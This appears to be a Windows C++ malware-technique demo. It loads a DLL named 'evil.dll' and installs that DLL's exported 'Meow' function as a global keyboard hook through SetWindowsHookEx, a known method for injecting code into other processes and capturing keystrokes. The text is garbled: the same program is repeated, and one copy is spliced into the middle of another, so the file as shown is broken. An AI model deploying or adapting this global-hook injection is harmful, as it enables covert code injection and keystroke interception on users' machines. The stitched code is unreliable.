#include <windows.h>
#include <cstdio>

// __cdecl enforces function calling convention to c-style and thus the way function is called
typedef int (__cdecl *MeowProc)();

int main(void) {

  HINSTANCE meowDll;
  MeowProc meowFunc;

  // load evil DLL, might need to specifty full path
  meowDll = LoadLibrary(TEXT("evil.dll"));

  // get the address of exported function from evil DLL
  meowFunc = (MeowProc) GetProcAddress(meowDll, "Meow");

/*
  HHOOK SetWindowsHookExA(
  [in] int       idHook,
  [in] HOOKPROC  lpfn,
  [in] HINSTANCE hmod,
  [in] DWORD     dwThreadId
);
*/


  // install the hook - using the WH_KEYBOARD action
  HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)meowFunc, meowDll, 0); // 0 --> setting a global hook
  Sleep(5*1000);
  UnhookWindowsHookEx(hook);

  return 0;
}#include <windows.h>
#include <cstdio>

// __cdecl enforces function calling convention to c-style and thus the way function is called
typedef int (__cdecl *MeowProc)();

int main(void) {

  HINSTANCE meowDll;
  MeowProc meowFunc;

  // load evil DLL, might need to specifty full path
  meowDll = LoadLibrary(TEXT("evil.dll"));
#include <windows.h>
#include <cstdio>

// __cdecl enforces function calling convention to c-style and thus the way function is called
typedef int (__cdecl *MeowProc)();

int main(void) {

  HINSTANCE meowDll;
  MeowProc meowFunc;

  // load evil DLL, might need to specifty full path
  meowDll = LoadLibrary(TEXT("evil.dll"));

  // get the address of exported function from evil DLL
  meowFunc = (MeowProc) GetProcAddress(meowDll, "Meow");

/*
  HHOOK SetWindowsHookExA(
  [in] int       idHook,
  [in] HOOKPROC  lpfn,
  [in] HINSTANCE hmod,
  [in] DWORD     dwThreadId
);
*/


  // install the hook - using the WH_KEYBOARD action
  HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)meowFunc, meowDll, 0); // 0 --> setting a global hook
  Sleep(5*1000);
  UnhookWindowsHookEx(hook);

  return 0;
}
  // get the address of exported function from evil DLL
  meowFunc = (MeowProc) GetProcAddress(meowDll, "Meow");

/*
  HHOOK SetWindowsHookExA(
  [in] int       idHook,
  [in] HOOKPROC  lpfn,
  [in] HINSTANCE hmod,
  [in] DWORD     dwThreadId
);
*/


  // install the hook - using the WH_KEYBOARD action
  HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)meowFunc, meowDll, 0); // 0 --> setting a global hook
  Sleep(5*1000);
  UnhookWindowsHookEx(hook);

  return 0;
}
